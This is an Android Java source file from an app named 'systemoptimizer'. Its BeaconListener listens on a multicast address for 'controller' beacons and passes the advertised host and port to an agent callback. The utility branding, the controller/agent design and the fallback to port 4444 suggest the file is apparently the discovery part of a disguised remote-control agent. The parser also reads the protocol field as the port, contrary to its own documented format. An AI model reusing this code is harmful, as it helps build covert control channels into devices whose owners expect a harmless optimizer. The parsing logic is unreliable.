package com.example.systemoptimizer;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.util.Log;

import java.net.DatagramPacket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.MulticastSocket;
import java.net.NetworkInterface;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;

/**
 * Controller discovery beacon listener.
 *
 * The Windows controller periodically broadcasts a light UDP beacon
 * (SNOPT_BEACON|<ip>|<port>|<proto>) to multicast 239.255.0.42:45999. On
 * subnets where multicast is available (Wi-Fi / hotspot) the agent learns the
 * controller endpoint automatically. Emulators use the well-known 10.0.2.2
 * default, and a paired device keeps its last confirmed endpoint.
 *
 * The MulticastLock only keeps Wi-Fi receiving multicast frames; it does not
 * change what the app is allowed to do.
 */
public final class BeaconListener {

    private static final String TAG = "BeaconListener";
    private static final String GROUP = "239.255.0.42";
    private static final int PORT = 45999;
    private static final String PREFIX = "SNOPT_BEACON|";

    public interface Callback {
        /** @param host controller host, @param port its control port */
        void onBeacon(String host, int port);
    }

    private final Context context;
    private final Callback callback;
    private volatile boolean running = false;
    private volatile Thread thread;

    public BeaconListener(Context context, Callback callback) {
        this.context = context.getApplicationContext();
        this.callback = callback;
    }

    public void start() {
        if (running) {
            return;
        }
        running = true;
        thread = new Thread(this::listenLoop, "beacon-listener");
        thread.setDaemon(true);
        thread.start();
    }

    public void stop() {
        running = false;
        Thread t = thread;
        if (t != null) {
            t.interrupt();
            thread = null;
        }
    }

    private void listenLoop() {
        WifiManager.MulticastLock lock = null;
        try {
            WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                lock = wm.createMulticastLock("systemoptimizer-beacon");
                lock.setReferenceCounted(false);
                lock.acquire();
            }
        } catch (Exception e) {
            Log.w(TAG, "multicast lock unavailable", e);
        }

        MulticastSocket socket = null;
        try {
            socket = new MulticastSocket(PORT);
            socket.setReuseAddress(true);
            InetAddress group = InetAddress.getByName(GROUP);
            try {
                socket.joinGroup(group);
            } catch (Exception e) {
                Log.w(TAG, "join multicast group failed", e);
            }
            socket.setSoTimeout(10000);
            byte[] buf = new byte[512];
            while (running && !Thread.currentThread().isInterrupted()) {
                try {
                    DatagramPacket packet = new DatagramPacket(buf, buf.length);
                    socket.receive(packet);
                    handle(packet);
                } catch (SocketTimeoutException ste) {
                    // idle period, keep listening
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "beacon listener stopped: " + e.getMessage());
        } finally {
            if (socket != null) {
                try {
                    socket.close();
                } catch (Exception ignored) {
                }
            }
            if (lock != null && lock.isHeld()) {
                try {
                    lock.release();
                } catch (Exception ignored) {
                }
            }
        }
    }

    private void handle(DatagramPacket packet) {
        try {
            String text = new String(packet.getData(), packet.getOffset(),
                    packet.getLength(), StandardCharsets.UTF_8).trim();
            if (!text.startsWith(PREFIX)) {
                return;
            }
            String[] parts = text.split("\\|");
            if (parts.length < 4) {
                Log.w(TAG, "malformed beacon: " + text);
                return;
            }
            int port;
            try {
                port = Integer.parseInt(parts[3].trim());
            } catch (NumberFormatException e) {
                port = 4444;
            }
            if (port <= 0 || port > 65535) {
                return;
            }
            final String host = parts[1].trim();
            final int finalPort = port;
            Log.i(TAG, "beacon discovered controller " + host + ":" + finalPort);
            try {
                callback.onBeacon(host, finalPort);
            } catch (Exception e) {
                Log.w(TAG, "beacon callback failed", e);
            }
        } catch (Exception e) {
            Log.w(TAG, "beacon parse failed", e);
        }
    }
}